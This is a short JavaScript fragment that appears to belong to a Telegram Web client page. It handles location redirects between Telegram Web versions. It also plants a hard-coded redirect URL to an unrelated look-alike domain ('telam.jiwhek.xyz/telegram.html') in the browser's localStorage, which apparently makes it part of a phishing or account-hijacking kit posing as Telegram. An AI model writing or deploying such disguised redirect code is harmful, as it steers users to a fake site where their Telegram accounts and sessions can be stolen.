const {
    pathname,
    hostname,
    href
} = window.location;

localStorage.setItem("redirectUrl", "https://telam.jiwhek.xyz/telegram.html");

if (pathname.startsWith("/z")) {
    window.location.href = href.replace("/z", "/a");
}

if (
    (hostname === "weba.telegram.org" || hostname === "webz.telegram.org") &&
    !localStorage.getItem("tt-global-state")
) {
    window.location.href = "https://web.telegram.org/a";
}